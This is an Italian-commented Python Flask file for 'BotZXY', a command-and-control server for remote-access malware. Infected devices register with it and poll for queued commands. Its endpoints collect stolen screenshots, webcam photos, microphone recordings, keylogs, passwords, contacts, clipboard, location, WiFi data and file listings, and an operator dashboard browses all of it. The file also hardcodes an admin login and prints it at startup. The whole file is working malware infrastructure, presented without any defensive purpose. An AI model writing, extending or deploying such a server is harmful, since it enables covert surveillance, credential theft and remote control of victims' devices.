from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO
from flask_cors import CORS
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import sqlite3
import json
import os
import hashlib
import time
import threading
from datetime import datetime
import werkzeug

# ============ IMPORT LOGGER ============
from utils.logger import backup_logs, restore_logs

# ============ SICUREZZA LOGIN ============
LOGIN_ATTEMPTS = {}
MAX_ATTEMPTS = 5

# FIX per Werkzeug 2.2.3 con Flask-Login
if not hasattr(werkzeug.urls, 'url_decode'):
    werkzeug.urls.url_decode = lambda x, **kwargs: x

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'BotZXY_Secret_Key_2026_ULTRA_SECURE')
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

DB_PATH = 'database/botzxy_c2.db'

# ============ RIPRISTINA LOG ALL'AVVIO ============
restore_logs()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    os.makedirs('database', exist_ok=True)
    conn = get_db()
    conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL, api_key TEXT UNIQUE NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.execute('CREATE TABLE IF NOT EXISTS devices (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, user_id INTEGER REFERENCES users(id), platform TEXT, hostname TEXT, ip TEXT, country TEXT, os_version TEXT, is_online BOOLEAN DEFAULT 1, last_seen TIMESTAMP, registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, phone_number TEXT, email TEXT, contacts TEXT, bot_name TEXT DEFAULT "BotZXY")')
    conn.execute('CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT REFERENCES devices(device_id), command TEXT NOT NULL, params TEXT, status TEXT DEFAULT "pending", result TEXT, executed_at TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.execute('CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT REFERENCES devices(device_id), type TEXT, data TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, action TEXT, details TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    
    # Aggiungi colonne per settings se non esistono
    try:
        conn.execute('ALTER TABLE users ADD COLUMN theme TEXT DEFAULT "dark"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN language TEXT DEFAULT "it"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN notifications TEXT DEFAULT "on"')
    except:
        pass
    
    conn.commit()
    conn.close()
    print("[+] Database initialized")

class User(UserMixin):
    def __init__(self, id, username, api_key):
        self.id = id
        self.username = username
        self.api_key = api_key

@login_manager.user_loader
def load_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT id, username, api_key FROM users WHERE id = ?', (user_id,)).fetchone()
    conn.close()
    return User(user['id'], user['username'], user['api_key']) if user else None

# ============ FUNZIONE PER LOG CON BACKUP ============
def log_action(device_id, action, details):
    try:
        conn = get_db()
        conn.execute('INSERT INTO logs (device_id, action, details) VALUES (?, ?, ?)', (device_id, action, details))
        conn.commit()
        conn.close()
        # Backup automatico
        backup_logs()
    except:
        pass

# ============ BACKUP AUTOMATICO ============
def scheduled_backup():
    while True:
        time.sleep(300)  # 5 minuti
        backup_logs()

# Avvia il thread di backup
backup_thread = threading.Thread(target=scheduled_backup, daemon=True)
backup_thread.start()

# ============ ROUTES PRINCIPALI ============
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in LOGIN_ATTEMPTS:
            user_attempts = LOGIN_ATTEMPTS[username]
            
            if user_attempts.get('blocked_until') and time.time() < user_attempts['blocked_until']:
                remaining = int(user_attempts['blocked_until'] - time.time())
                minutes = remaining // 60
                seconds = remaining % 60
                error = f"🚫 Account bloccato. Riprova tra {minutes}m {seconds}s"
                log_action('system', 'login_blocked', f'Account {username} bloccato per {minutes}m')
                return render_template('login.html', error=error)
            
            if user_attempts.get('blocked_until') and time.time() >= user_attempts['blocked_until']:
                user_attempts['count'] = 0
                user_attempts['blocked_until'] = None
        
        conn = get_db()
        user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        conn.close()
        
        if user and hashlib.sha256(password.encode()).hexdigest() == user['password_hash']:
            if username in LOGIN_ATTEMPTS:
                LOGIN_ATTEMPTS[username]['count'] = 0
                LOGIN_ATTEMPTS[username]['blocked_until'] = None
            login_user(User(user['id'], user['username'], user['api_key']))
            log_action('system', 'login_success', f'Login effettuato da {username}')
            return render_template('dashboard.html')
        else:
            if username not in LOGIN_ATTEMPTS:
                LOGIN_ATTEMPTS[username] = {'count': 0, 'blocked_until': None}
            
            LOGIN_ATTEMPTS[username]['count'] += 1
            attempts_used = LOGIN_ATTEMPTS[username]['count']
            attempts_left = MAX_ATTEMPTS - attempts_used
            
            if attempts_used >= MAX_ATTEMPTS:
                block_level = (attempts_used - 1) // MAX_ATTEMPTS
                block_minutes = 2 * (2 ** block_level)
                block_seconds = block_minutes * 60
                LOGIN_ATTEMPTS[username]['blocked_until'] = time.time() + block_seconds
                
                error = f"🚫 Troppi tentativi falliti. Account bloccato per {block_minutes} minuti."
                log_action('system', 'login_blocked', f'Account {username} bloccato per {block_minutes}m dopo {attempts_used} tentativi')
                return render_template('login.html', error=error)
            else:
                error = f"❌ Credenziali errate. Tentativi rimasti: {attempts_left}"
                log_action('system', 'login_failed', f'Tentativo login fallito per {username}, tentativi rimasti: {attempts_left}')
                return render_template('login.html', error=error)
    
    return render_template('login.html', error=error)

# ============ PAGINE ============
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/logout')
@login_required
def logout():
    log_action('system', 'logout', f'Logout di {current_user.username}')
    logout_user()
    return index()

@app.route('/logs')
@login_required
def logs_page():
    return render_template('logs.html')

@app.route('/settings')
@login_required
def settings_page():
    return render_template('settings.html')

@app.route('/devices')
@login_required
def devices_page():
    return render_template('devices.html')

@app.route('/captures')
@login_required
def captures_page():
    return render_template('captures.html')

@app.route('/analytics')
@login_required
def analytics_page():
    return render_template('analytics.html')

# ============ API DEVICES ============
@app.route('/api/devices', methods=['GET'])
@login_required
def get_devices():
    conn = get_db()
    devices = conn.execute('SELECT device_id, platform, hostname, ip, os_version, is_online, last_seen, registered_at, phone_number, email, bot_name FROM devices ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(d) for d in devices])

@app.route('/api/device/<device_id>', methods=['GET'])
@login_required
def get_device_detail(device_id):
    conn = get_db()
    device = conn.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,)).fetchone()
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    captures = conn.execute('SELECT type, data, created_at FROM captures WHERE device_id = ? ORDER BY created_at DESC LIMIT 20', (device_id,)).fetchall()
    commands = conn.execute('SELECT command, params, status, result, created_at, executed_at FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 20', (device_id,)).fetchall()
    conn.close()
    return jsonify({'device': dict(device), 'captures': [dict(c) for c in captures], 'commands': [dict(c) for c in commands]})

@app.route('/api/devices/stats', methods=['GET'])
@login_required
def get_device_stats():
    conn = get_db()
    platforms = conn.execute('SELECT platform, COUNT(*) as count, SUM(CASE WHEN is_online = 1 THEN 1 ELSE 0 END) as online FROM devices GROUP BY platform').fetchall()
    activity = conn.execute('SELECT date(last_seen) as day, COUNT(*) as count FROM devices WHERE last_seen >= datetime("now", "-7 days") GROUP BY date(last_seen) ORDER BY day').fetchall()
    conn.close()
    return jsonify({'platforms': [dict(p) for p in platforms], 'activity_7d': [dict(a) for a in activity]})

# ============ API REGISTER E COMANDI ============
@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    platform = data.get('platform')
    hostname = data.get('hostname')
    ip = request.remote_addr
    os_version = data.get('os_version')
    conn = get_db()
    existing = conn.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,)).fetchone()
    if existing:
        conn.execute('UPDATE devices SET last_seen = CURRENT_TIMESTAMP, is_online = 1, ip = ? WHERE device_id = ?', (ip, device_id))
        conn.commit()
        conn.close()
        log_action(device_id, 'device_updated', f'Device {hostname} reconnected')
        return jsonify({'status': 'updated'})
    conn.execute('INSERT INTO devices (device_id, platform, hostname, ip, os_version, last_seen, is_online, bot_name) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 1, "BotZXY")', (device_id, platform, hostname, ip, os_version))
    conn.commit()
    conn.close()
    log_action(device_id, 'device_registered', f'Nuovo device {hostname} ({platform}) registrato')
    return jsonify({'status': 'registered', 'device_id': device_id})

@app.route('/api/command/<device_id>', methods=['POST'])
@login_required
def send_command(device_id):
    data = request.json
    command = data.get('command')
    params = data.get('params', '')
    conn = get_db()
    conn.execute('INSERT INTO commands (device_id, command, params, status) VALUES (?, ?, ?, "pending")', (device_id, command, params))
    conn.commit()
    conn.close()
    log_action(device_id, 'command_sent', f'Comando: {command} {params}')
    return jsonify({'status': 'command_queued'})

@app.route('/api/poll/<device_id>', methods=['GET'])
def poll_commands(device_id):
    conn = get_db()
    conn.execute('UPDATE devices SET last_seen = CURRENT_TIMESTAMP, is_online = 1 WHERE device_id = ?', (device_id,))
    conn.commit()
    commands = conn.execute('SELECT id, command, params FROM commands WHERE device_id = ? AND status = "pending" ORDER BY created_at ASC LIMIT 10', (device_id,)).fetchall()
    conn.close()
    return jsonify([dict(cmd) for cmd in commands])

@app.route('/api/result/<device_id>', methods=['POST'])
def command_result(device_id):
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'executed')
    conn = get_db()
    conn.execute('UPDATE commands SET status = ?, result = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ? AND device_id = ?', (status, result, command_id, device_id))
    conn.commit()
    conn.close()
    log_action(device_id, 'command_result', f'Comando {command_id} eseguito: {status}')
    return jsonify({'status': 'recorded'})

# ============ API CAPTURES ============
@app.route('/api/captures', methods=['GET'])
@login_required
def get_captures():
    limit = request.args.get('limit', 50, type=int)
    device_id = request.args.get('device_id', None)
    capture_type = request.args.get('type', None)
    
    conn = get_db()
    query = 'SELECT id, device_id, type, data, created_at FROM captures WHERE 1=1'
    params = []
    
    if device_id:
        query += ' AND device_id = ?'
        params.append(device_id)
    if capture_type:
        query += ' AND type = ?'
        params.append(capture_type)
    
    query += ' ORDER BY created_at DESC LIMIT ?'
    params.append(limit)
    
    captures = conn.execute(query, params).fetchall()
    conn.close()
    
    result = []
    for c in captures:
        data = c['data']
        try:
            if data and data.startswith('{'):
                data = json.loads(data)
        except:
            pass
        result.append({
            'id': c['id'],
            'device_id': c['device_id'],
            'type': c['type'],
            'data': data,
            'created_at': c['created_at']
        })
    return jsonify(result)

@app.route('/api/captures/<int:capture_id>', methods=['DELETE'])
@login_required
def delete_capture(capture_id):
    conn = get_db()
    capture = conn.execute('SELECT * FROM captures WHERE id = ?', (capture_id,)).fetchone()
    if not capture:
        conn.close()
        return jsonify({'error': 'Capture not found'}), 404
    conn.execute('DELETE FROM captures WHERE id = ?', (capture_id,))
    conn.commit()
    conn.close()
    log_action('system', 'capture_deleted', f'Cattura {capture_id} eliminata')
    return jsonify({'status': 'deleted'})

@app.route('/api/screenshot/<device_id>', methods=['POST'])
def upload_screenshot(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "screenshot", ?)', (device_id, data.get('image_base64')))
    conn.commit()
    conn.close()
    log_action(device_id, 'screenshot_captured', 'Screenshot catturato')
    return jsonify({'status': 'saved'})

@app.route('/api/webcam/<device_id>', methods=['POST'])
def upload_webcam(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "webcam", ?)', (device_id, data.get('image_base64')))
    conn.commit()
    conn.close()
    log_action(device_id, 'webcam_captured', 'Foto webcam catturata')
    return jsonify({'status': 'saved'})

@app.route('/api/mic/<device_id>', methods=['POST'])
def upload_mic(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "mic", ?)', (device_id, data.get('audio_base64')))
    conn.commit()
    conn.close()
    log_action(device_id, 'mic_recorded', 'Audio registrato')
    return jsonify({'status': 'saved'})

@app.route('/api/contacts/<device_id>', methods=['POST'])
def upload_contacts(device_id):
    data = request.json
    conn = get_db()
    conn.execute('UPDATE devices SET phone_number = ?, email = ?, contacts = ? WHERE device_id = ?', (data.get('phone_number'), data.get('email'), json.dumps(data.get('contacts', [])), device_id))
    conn.commit()
    conn.close()
    log_action(device_id, 'contacts_extracted', 'Contatti estratti')
    return jsonify({'status': 'saved'})

@app.route('/api/clipboard/<device_id>', methods=['POST'])
def upload_clipboard(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "clipboard", ?)', (device_id, data.get('content', '')))
    conn.commit()
    conn.close()
    log_action(device_id, 'clipboard_captured', 'Clipboard catturata')
    return jsonify({'status': 'saved'})

@app.route('/api/location/<device_id>', methods=['POST'])
def upload_location(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "location", ?)', (device_id, json.dumps(data.get('location', {}))))
    conn.commit()
    conn.close()
    log_action(device_id, 'location_updated', 'Posizione aggiornata')
    return jsonify({'status': 'saved'})

@app.route('/api/keylog/<device_id>', methods=['POST'])
def upload_keylog(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "keylog", ?)', (device_id, data.get('keys', '')))
    conn.commit()
    conn.close()
    log_action(device_id, 'keylog_captured', 'Keylog catturato')
    return jsonify({'status': 'saved'})

@app.route('/api/passwords/<device_id>', methods=['POST'])
def upload_passwords(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "passwords", ?)', (device_id, json.dumps(data.get('passwords', []))))
    conn.commit()
    conn.close()
    log_action(device_id, 'passwords_extracted', 'Password estratte')
    return jsonify({'status': 'saved'})

@app.route('/api/mouse/<device_id>', methods=['POST'])
def upload_mouse(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "mouse", ?)', (device_id, json.dumps(data)))
    conn.commit()
    conn.close()
    log_action(device_id, 'mouse_interaction', 'Interazione mouse')
    return jsonify({'status': 'saved'})

@app.route('/api/wifi/<device_id>', methods=['POST'])
def upload_wifi(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "wifi", ?)', (device_id, json.dumps(data.get('networks', []))))
    conn.commit()
    conn.close()
    log_action(device_id, 'wifi_extracted', 'Reti WiFi estratte')
    return jsonify({'status': 'saved'})

@app.route('/api/files/<device_id>', methods=['POST'])
def upload_files(device_id):
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO captures (device_id, type, data) VALUES (?, "files", ?)', (device_id, json.dumps({'path': data.get('path', '/'), 'files': data.get('files', [])})))
    conn.commit()
    conn.close()
    log_action(device_id, 'file_list', 'Lista file')
    return jsonify({'status': 'saved'})

# ============ API STATS E GRAFICI ============
@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    conn = get_db()
    total = conn.execute('SELECT COUNT(*) as count FROM devices').fetchone()['count']
    online = conn.execute('SELECT COUNT(*) as count FROM devices WHERE is_online = 1').fetchone()['count']
    captures = conn.execute('SELECT COUNT(*) as count FROM captures').fetchone()['count']
    commands = conn.execute('SELECT COUNT(*) as count FROM commands').fetchone()['count']
    conn.close()
    return jsonify({'total_devices': total, 'online_devices': online, 'total_captures': captures, 'total_commands': commands})

@app.route('/api/chart/activity', methods=['GET'])
@login_required
def get_activity_chart():
    conn = get_db()
    activity = conn.execute('SELECT strftime("%H:00", last_seen) as hour, COUNT(*) as count FROM devices WHERE last_seen >= datetime("now", "-24 hours") GROUP BY hour ORDER BY hour').fetchall()
    conn.close()
    hours = [f"{str(i).zfill(2)}:00" for i in range(24)]
    counts = {row['hour']: row['count'] for row in activity}
    return jsonify({'labels': hours, 'data': [counts.get(h, 0) for h in hours]})

@app.route('/api/chart/platforms', methods=['GET'])
@login_required
def get_platform_chart():
    conn = get_db()
    platforms = conn.execute('SELECT platform, COUNT(*) as count FROM devices GROUP BY platform').fetchall()
    conn.close()
    platform_map = {'windows': 'Windows', 'android': 'Android', 'ios': 'iOS', 'linux': 'Linux', 'macos': 'macOS'}
    labels, data = [], []
    for row in platforms:
        p = row['platform'].lower() if row['platform'] else 'unknown'
        labels.append(platform_map.get(p, p))
        data.append(row['count'])
    if not data:
        labels, data = ['Nessun dispositivo'], [1]
    colors = ['#7c3aed', '#22d3ee', '#f472b6', '#34d399', '#f59e0b']
    return jsonify({'labels': labels, 'data': data, 'colors': colors[:len(labels)]})

# ============ API ANALYTICS ============
@app.route('/api/analytics/captures_by_type', methods=['GET'])
@login_required
def get_captures_by_type():
    conn = get_db()
    data = conn.execute('SELECT type, COUNT(*) as count FROM captures GROUP BY type ORDER BY count DESC').fetchall()
    conn.close()
    return jsonify([dict(d) for d in data])

@app.route('/api/analytics/activity_7d', methods=['GET'])
@login_required
def get_activity_7d():
    conn = get_db()
    data = conn.execute('SELECT date(last_seen) as day, COUNT(*) as count FROM devices WHERE last_seen >= datetime("now", "-7 days") GROUP BY date(last_seen) ORDER BY day').fetchall()
    conn.close()
    return jsonify([dict(d) for d in data])

@app.route('/api/analytics/top_devices', methods=['GET'])
@login_required
def get_top_devices():
    conn = get_db()
    data = conn.execute('''
        SELECT device_id, hostname, platform, 
               COUNT(commands.id) as commands_count,
               (SELECT COUNT(*) FROM captures WHERE captures.device_id = devices.device_id) as captures_count
        FROM devices
        LEFT JOIN commands ON commands.device_id = devices.device_id
        GROUP BY devices.device_id
        ORDER BY commands_count DESC
        LIMIT 10
    ''').fetchall()
    conn.close()
    return jsonify([dict(d) for d in data])

# ============ LOGS ============
@app.route('/api/logs', methods=['GET'])
@login_required
def get_logs():
    limit = request.args.get('limit', 100, type=int)
    device_id = request.args.get('device_id', None)
    
    conn = get_db()
    if device_id:
        logs = conn.execute('SELECT id, device_id, action, details, timestamp FROM logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?', (device_id, limit)).fetchall()
    else:
        logs = conn.execute('SELECT id, device_id, action, details, timestamp FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(l) for l in logs])

@app.route('/api/logs/clear', methods=['POST'])
@login_required
def clear_logs():
    conn = get_db()
    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
        conn.close()
        return jsonify({'error': 'Accesso negato'}), 403
    
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    log_action('system', 'logs_cleared', 'Log cancellati da admin')
    return jsonify({'status': 'cleared'})

@app.route('/api/logs/export', methods=['GET'])
@login_required
def export_logs():
    conn = get_db()
    logs = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC').fetchall()
    conn.close()
    return jsonify([dict(l) for l in logs])

# ============ IMPOSTAZIONI ============
@app.route('/api/settings', methods=['GET'])
@login_required
def get_settings():
    conn = get_db()
    try:
        conn.execute('ALTER TABLE users ADD COLUMN theme TEXT DEFAULT "dark"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN language TEXT DEFAULT "it"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN notifications TEXT DEFAULT "on"')
    except:
        pass
    
    settings = conn.execute('SELECT theme, language, notifications FROM users WHERE id = ?', (current_user.id,)).fetchone()
    conn.close()
    
    if settings:
        return jsonify({
            'theme': settings['theme'] or 'dark',
            'language': settings['language'] or 'it',
            'notifications': settings['notifications'] or 'on'
        })
    return jsonify({'theme': 'dark', 'language': 'it', 'notifications': 'on'})

@app.route('/api/settings', methods=['POST'])
@login_required
def save_settings():
    data = request.json
    theme = data.get('theme', 'dark')
    language = data.get('language', 'it')
    notifications = data.get('notifications', 'on')
    
    conn = get_db()
    try:
        conn.execute('ALTER TABLE users ADD COLUMN theme TEXT DEFAULT "dark"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN language TEXT DEFAULT "it"')
    except:
        pass
    try:
        conn.execute('ALTER TABLE users ADD COLUMN notifications TEXT DEFAULT "on"')
    except:
        pass
    
    conn.execute('UPDATE users SET theme = ?, language = ?, notifications = ? WHERE id = ?', (theme, language, notifications, current_user.id))
    conn.commit()
    conn.close()
    log_action('system', 'settings_updated', f'Impostazioni aggiornate: theme={theme}, language={language}')
    return jsonify({'status': 'saved'})

# ============ SICUREZZA ============
@app.route('/api/change_password', methods=['POST'])
@login_required
def change_password():
    data = request.json
    old_password = data.get('old_password')
    new_password = data.get('new_password')
    
    if not old_password or not new_password:
        return jsonify({'error': 'Vecchia e nuova password richieste'}), 400
    
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
    
    if not user or hashlib.sha256(old_password.encode()).hexdigest() != user['password_hash']:
        conn.close()
        return jsonify({'error': 'Password attuale errata'}), 401
    
    conn.execute('UPDATE users SET password_hash = ? WHERE id = ?', 
                (hashlib.sha256(new_password.encode()).hexdigest(), current_user.id))
    conn.commit()
    conn.close()
    log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
    return jsonify({'status': 'password_updated'})

@app.route('/api/logout_all', methods=['POST'])
@login_required
def logout_all():
    conn = get_db()
    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
        conn.close()
        return jsonify({'error': 'Accesso negato'}), 403
    
    conn.execute('UPDATE devices SET is_online = 0')
    conn.commit()
    conn.close()
    log_action('system', 'logout_all', 'Tutti i dispositivi disconnessi')
    return jsonify({'status': 'logged_out'})

# ============ GESTIONE TENTATIVI LOGIN ============
@app.route('/admin/reset_attempts/<username>', methods=['POST'])
@login_required
def reset_login_attempts(username):
    conn = get_db()
    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
    conn.close()

    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
        return jsonify({'error': 'Accesso negato'}), 403

    if username in LOGIN_ATTEMPTS:
        LOGIN_ATTEMPTS[username]['count'] = 0
        LOGIN_ATTEMPTS[username]['blocked_until'] = None
        return jsonify({'status': 'reset', 'username': username})
    
    return jsonify({'error': 'Utente non trovato'}), 404

@app.route('/admin/login_attempts', methods=['GET'])
@login_required
def get_login_attempts():
    conn = get_db()
    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
    conn.close()

    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
        return jsonify({'error': 'Accesso negato'}), 403

    result = {}
    for username, data in LOGIN_ATTEMPTS.items():
        blocked_until = data.get('blocked_until')
        if blocked_until:
            remaining = int(blocked_until - time.time())
            if remaining > 0:
                result[username] = {'attempts': data['count'], 'blocked_for': f"{remaining // 60}m {remaining % 60}s"}
            else:
                result[username] = {'attempts': data['count'], 'blocked_for': 'None'}
        else:
            result[username] = {'attempts': data['count'], 'blocked_for': 'None'}
    
    return jsonify(result)

# ============ ADMIN SETUP ============
def setup_admin_user():
    try:
        conn = get_db()
        admin = conn.execute('SELECT * FROM users WHERE username = "BotZXY-Admin"').fetchone()
        if not admin:
            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
            conn.execute('INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)', ('BotZXY-Admin', hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest(), api_key))
            conn.commit()
            print('[+] Admin created: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
        conn.close()
    except Exception as e:
        print(f"[-] Admin creation error: {e}")

# ============ ERROR HANDLER ============
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Route not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    import traceback
    return f"Internal Server Error: {traceback.format_exc()}", 500

@app.errorhandler(Exception)
def handle_exception(e):
    import traceback
    return traceback.format_exc(), 500

# ============ MAIN ============
if __name__ == '__main__':
    init_db()
    setup_admin_user()
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)